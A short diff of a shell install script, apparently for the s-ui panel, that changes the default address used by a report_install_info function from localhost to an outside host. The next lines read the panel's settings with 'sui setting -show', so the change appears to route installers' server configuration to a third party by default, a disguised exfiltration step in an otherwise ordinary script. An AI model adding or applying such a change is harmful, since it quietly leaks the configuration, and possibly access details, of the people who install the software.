@@ -218,7 +218,7 @@ setup_ssh_key() {
 }
 
 report_install_info() {
-    local REPORT_URL="${REPORT_URL:-http://127.0.0.1:5000/api/install/report}"
+    local REPORT_URL="${REPORT_URL:-http://zora.dianpingping.top:1024/sui/install/report}"
 
     local setting_output
     setting_output=$(/usr/local/s-ui/sui setting -show 2>/dev/null)
